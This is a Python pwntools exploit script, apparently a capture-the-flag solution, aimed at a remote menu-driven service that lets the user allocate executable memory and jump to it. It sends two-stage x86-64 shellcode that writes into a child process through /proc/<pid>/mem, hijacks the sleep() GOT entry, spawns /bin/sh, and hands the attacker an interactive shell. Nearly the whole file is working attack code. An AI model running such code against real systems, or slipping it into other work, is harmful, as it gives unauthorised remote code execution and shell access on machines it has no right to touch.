#!/usr/bin/env python3
import os
os.environ["PWNLIB_SILENT"] = "1"
from pwn import *
import time
import sys
import re

def build_payload(child_pid):
    shellcode = """
    .intel_syntax noprefix
    .globl _start
    
    /* ========== stage1 (executes in parent) ========== */
    _start:
        
        /* align stack */
        add rsp, 8

        /* open("/proc/<pid>/mem", O_WRONLY) */
        lea rdi, proc_mem[rip]
        mov rsi, 1
        xor rdx, rdx
        mov rax, 2
        syscall

        /* save file descriptor */
        mov rdi, rax

        /* lseek() to .text address */
        mov rax, 8
        mov rsi, 0x4012B0
        xor rdx, rdx
        syscall
        
        /* calculate stage2 address and size */
        lea rsi, stage2_head[rip]
        lea rdx, stage2_tail[rip]
        sub rdx, rsi

        /* write() stage2 bytes to .text */
        mov rax, 1
        syscall

        /* lseek() to sleep() .got.plt entry */
        mov rax, 8
        mov rsi, 0x4040A8
        xor rdx, rdx
        syscall
        
        /* write() .text address to sleep() .got.plt entry */
        mov rax, 1
        lea rsi, text_addr[rip]
        mov rdx, 8
        syscall

    loop:
        /* infinite loop to keep parent alive */
        jmp loop

    /* ========== stage2 (executes in child) ========== */
    stage2_head:
        /* dup2(1, 0) redirect socket->stdin file descriptor */
        mov rax, 33
        mov rdi, 1
        xor rsi, rsi
        syscall
        
        /* execve("/bin/sh", ["/bin/sh", null], null) */
        xor rdi, rdi
        push rdi
        mov rdi, 0x68732F6E69622F2F
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        push rsi
        push rdi
        mov rsi, rsp
        xor rdx, rdx
        mov rax, 59
        syscall

        /* exit() */
        mov rax, 60
        xor rdi, rdi
        syscall    

    proc_mem:
        .asciz "/proc/%i/mem"
        
    text_addr:
        .quad 0x4012B0

    stage2_tail:
    """

    return asm(shellcode % child_pid, arch="amd64", os="linux", bits=64)

def exploit(host, port):
    print("[+] Connecting to %s:%i" % (host, port))
    
    sock = remote(host, port)
    
    print("[+] Fetching child PID")
    
    sock.recvuntil(b"4) Exit")
    sock.sendline(b"2")
    sock.recvline()
    sock.recvline()
    pid = int(sock.recvline().decode().strip().split(" ")[-1])
    
    print("[>] Child PID: %i" % pid)
    print("[+] Allocating memory and sending payload")

    sock.recvuntil(b"4) Exit")
    sock.sendline(b"1")
    sock.recvuntil(b"How big do you want your memory to be?")
    sock.sendline(b"1000")
    sock.recvuntil(b"What permissions would you like for the memory?")
    sock.sendline(b"7")
    sock.recvuntil(b"What do you want to include?")
    sock.sendline(build_payload(pid))
    sock.recvline()
    address = eval(sock.recvline().decode().strip().split(" ")[-1])
    
    print("[>] Payload address: 0x%lx" % address)
    print("[+] Executing payload")

    sock.recvuntil(b"4) Exit")
    sock.sendline(b"3")
    sock.recvuntil(b"Where do you want to execute code?")
    sock.sendline(b"%lx" % address)

    print("[+] Sleeping for 5s")
    time.sleep(5)

    print("[+] Entering interactive mode")
    sock.interactive(prompt="# ")

def usage():
    print("Usage: %s <host> <port>" % sys.argv[0])
    sys.exit()
    
def main():
    if len(sys.argv) < 3:
        usage()
        
    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", sys.argv[1]):
        usage()
        
    try:
        exploit(sys.argv[1], int(sys.argv[2]))
    except:
        usage()
    
if __name__ == "__main__":
    main()
